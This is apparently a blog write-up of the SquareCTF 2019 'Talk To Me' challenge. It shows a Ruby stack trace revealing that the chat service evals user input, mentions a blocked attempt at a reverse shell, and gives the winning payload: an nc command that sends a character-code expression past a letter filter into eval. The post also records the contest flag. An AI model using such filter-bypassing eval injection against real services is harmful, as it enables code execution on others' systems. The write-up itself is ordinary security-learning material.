---
layout: post
title: "Solution to SquareCTF 2019 - Talk To Me"
author: capitol
category: ctf
---

##### Name:
Talk To Me

##### Category:
general - ruby

##### Points:
100

#### Writeup

![ruubies](/images/jewelry-2555686_640.png)

We got a telnet interface to a small chat bot, but it didn't understand anything we said
to it at first.

Sending it characters that wasn't in `[A-Za-z]` gave a more interesting result:

```text
(eval):1: syntax error, unexpected end-of-input, expecting ')'
(%=;10-90*1.500/1.1002+9,|'")
                             ^
/talk_to_me.rb:16:in `eval'
/talk_to_me.rb:16:in `receive_data'
/var/lib/gems/2.5.0/gems/eventmachine-1.2.7/lib/eventmachine.rb:195:in `run_machine'
/var/lib/gems/2.5.0/gems/eventmachine-1.2.7/lib/eventmachine.rb:195:in `run'
/talk_to_me.rb:31:in `<main>'
```

So obviously they ran the input through eval. This led us down a rabbit hole of trying to 
get a reverse shell working, but that was blocked.

And then one of us noticed that the chat bot asked us to greet it as it had greeted us, so
the problem was reduced to how to send it something that could pass the first check for 
`[A-Za-z]` and then be evaluated to the string 'Hello!'.

Since none of us where ruby programmers this took quite a while to figure out. 
The solution we came up with in the end was:

```bash
$ (sleep 1; echo "('' << 72)+('' << 101)+( '' << 108)+( '' << 108)+('' << 111)+('' << 33)") | nc -v talk-to-me-dd00922915bfc3f1.squarectf.com 5678
```

The flag was `flag-2b8f1139b0726726`.

